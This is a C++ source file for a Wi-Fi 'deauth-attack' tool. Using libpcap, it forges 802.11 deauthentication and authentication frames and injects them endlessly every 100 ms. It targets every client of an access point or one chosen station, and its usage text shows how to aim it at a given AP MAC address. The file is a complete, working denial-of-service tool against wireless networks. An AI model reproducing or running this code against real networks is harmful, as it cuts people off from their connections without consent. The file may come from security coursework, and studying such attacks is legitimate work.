#include <cstdio>
#include <pcap.h>
#include <cstdint>
#include <chrono>
#include <thread>
#include "radiotap.h"

using namespace std;

void usage() {
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[]) {
	if (argc != 3 && argc != 4 && argc != 5) {
		usage();
		return -1;
	}

    char* dev = argv[1];
    uint8_t StationMAC[6];
    uint8_t APMAC[6];
    sscanf(argv[2], "%x:%x:%x:%x:%x:%x", &APMAC[0], &APMAC[1], &APMAC[2], &APMAC[3], &APMAC[4], &APMAC[5]);

	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);

    int res;
    chrono::milliseconds sleepDuration(100);

    if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }

    Radiotap radiotap;

    switch (argc) {
    case 3: {
        printf("[AP broadcast attack]\n");

        Deauthentication broadDeauth;

        for (int i = 0; i < 6; i++) {
            broadDeauth.destAddr[i] = 0xff;
            broadDeauth.sourAddr[i] = APMAC[i];
            broadDeauth.BSSID[i] = APMAC[i];
        }

        TestPacket<Deauthentication> deauthPacket = {
            radiotap,
            broadDeauth
        };

        while (true) {
            res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&deauthPacket), sizeof(deauthPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }

            this_thread::sleep_for(sleepDuration);
        }

        break;
    }
    case 4: {
        printf("[AP, Station unicast attack]\n");

        sscanf(argv[3], "%x:%x:%x:%x:%x:%x", &StationMAC[0], &StationMAC[1], &StationMAC[2], &StationMAC[3], &StationMAC[4], &StationMAC[5]);

        Deauthentication APStDeauth;

        for (int i = 0; i < 6; i++) {
            APStDeauth.destAddr[i] = StationMAC[i];
            APStDeauth.sourAddr[i] = APMAC[i];
            APStDeauth.BSSID[i] = APMAC[i];
        }

        Deauthentication StAPDeauth;

        for (int i = 0; i < 6; i++) {
            StAPDeauth.destAddr[i] = APMAC[i];
            StAPDeauth.sourAddr[i] = StationMAC[i];
            StAPDeauth.BSSID[i] = APMAC[i];
        }

        TestPacket<Deauthentication> APStdeauthPacket = {
            radiotap,
            APStDeauth
        };

        TestPacket<Deauthentication> StAPdeauthPacket = {
            radiotap,
            StAPDeauth
        };

        while (true) {
            res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&APStdeauthPacket), sizeof(APStdeauthPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }

            this_thread::sleep_for(sleepDuration);

            res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&StAPdeauthPacket), sizeof(StAPdeauthPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }

            this_thread::sleep_for(sleepDuration);
        }

        break;
    }
    case 5: {
        printf("[Authentication attack]\n");

        sscanf(argv[3], "%x:%x:%x:%x:%x:%x", &StationMAC[0], &StationMAC[1], &StationMAC[2], &StationMAC[3], &StationMAC[4], &StationMAC[5]);

        Authentication authentication;

        for (int i = 0; i < 6; i++) {
            authentication.destAddr[i] = APMAC[i];
            authentication.sourAddr[i] = StationMAC[i];
            authentication.BSSID[i] = APMAC[i];
        }

        TestPacket<Authentication> authPacket = {
            radiotap,
            authentication
        };

        while (true) {
            res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&authPacket), sizeof(authPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }

            this_thread::sleep_for(sleepDuration);
        }

        break;
    }
    default:
        break;
    }

	pcap_close(pcap);
}